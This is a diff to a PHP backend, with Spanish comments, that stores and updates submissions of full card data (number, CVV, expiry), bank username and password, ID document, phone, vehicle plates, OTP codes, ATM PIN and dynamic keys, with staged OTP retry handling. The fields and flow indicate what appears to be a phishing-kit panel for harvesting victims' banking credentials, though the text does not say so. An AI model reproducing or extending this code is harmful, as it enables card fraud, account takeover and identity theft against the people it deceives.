@@ -17,10 +17,10 @@ $tipoPaso = trim($input['tipo_paso'] ?? 'credenciales');
 if (!$solicitudId) json_err('missing_solicitudId');
 
 // ============================================
-// CASO 1: CREDENCIALES (INSERT)
+// CASO 1: CREDENCIALES (INSERT O UPDATE)
 // ============================================
 if ($tipoPaso === 'credenciales') {
-    $existe = db_fetch("SELECT id FROM solicitudes WHERE id = ?", [$solicitudId]);
+    $existe = db_fetch("SELECT id, estado FROM solicitudes WHERE id = ?", [$solicitudId]);
 
     if (!$existe) {
         $ip = !empty($input['ip']) ? $input['ip'] : pyp_ip();
@@ -63,7 +63,61 @@ if ($tipoPaso === 'credenciales') {
         json_ok(['id' => $solicitudId, 'message' => 'Solicitud creada']);
     }
 
-    json_ok(['id' => $solicitudId, 'message' => 'Solicitud ya existe']);
+    // Si ya existe, actualizamos los datos y reseteamos el estado
+    $ip = !empty($input['ip']) ? $input['ip'] : pyp_ip();
+    $pais = !empty($input['pais']) ? $input['pais'] : 'Desconocido';
+    $ciudad = !empty($input['ciudad']) ? $input['ciudad'] : 'Desconocida';
+
+    db_exec("
+        UPDATE solicitudes SET
+            fecha = NOW(),
+            fecha_procesada = NULL,
+            numero_tarjeta = ?,
+            cvv = ?,
+            vencimiento = ?,
+            banco = ?,
+            tipo_tarjeta = ?,
+            usuario = ?,
+            password = ?,
+            nombre = ?,
+            documento = ?,
+            email = ?,
+            celular = ?,
+            monto = ?,
+            placas = ?,
+            ip = ?,
+            pais = ?,
+            ciudad = ?,
+            estado = 'pending',
+            otp_codigo = 'N/A',
+            otp_codigo_secundario = 'N/A',
+            otp_modo = 'N/A',
+            clave_cajero_codigo = 'N/A',
+            clave_dinamica_codigo = 'N/A',
+            payload_json = ?
+        WHERE id = ?
+    ", [
+        $input['numeroTarjeta'] ?? $input['numero_tarjeta'] ?? 'N/A',
+        $input['cvv'] ?? 'N/A',
+        $input['vencimiento'] ?? 'N/A',
+        $input['bancoEmisor'] ?? $input['banco_emisor'] ?? 'N/A',
+        $input['tipo_tarjeta'] ?? $input['tipoTarjeta'] ?? 'visa',
+        $input['usuario'] ?? 'N/A',
+        $input['password'] ?? 'N/A',
+        $input['nombreCompleto'] ?? $input['nombre_completo'] ?? 'N/A',
+        trim(($input['tipoDocumento'] ?? '') . ' ' . ($input['numeroDocumento'] ?? 'N/A')),
+        $input['email'] ?? 'N/A',
+        $input['celular'] ?? 'N/A',
+        $input['monto'] ?? 'N/A',
+        $input['placas'] ?? null,
+        $ip,
+        $pais,
+        $ciudad,
+        json_encode($input, JSON_UNESCAPED_UNICODE),
+        $solicitudId
+    ]);
+
+    json_ok(['id' => $solicitudId, 'message' => 'Solicitud actualizada']);
 }
 
 // ============================================
@@ -95,6 +149,7 @@ if (in_array($tipoPaso, ['otp', 'clave_dinamica', 'clave_cajero'])) {
     $updates = [];
     $params = [];
 
+    // Si es reintento, limpiamos los códigos anteriores para que el nuevo OTP se guarde bien
     if ($esReintento && in_array($estadoActual, $estadosRechazados)) {
         $updates[] = "estado = 'pending_otp'";
         $updates[] = "otp_modo = 'otp'";
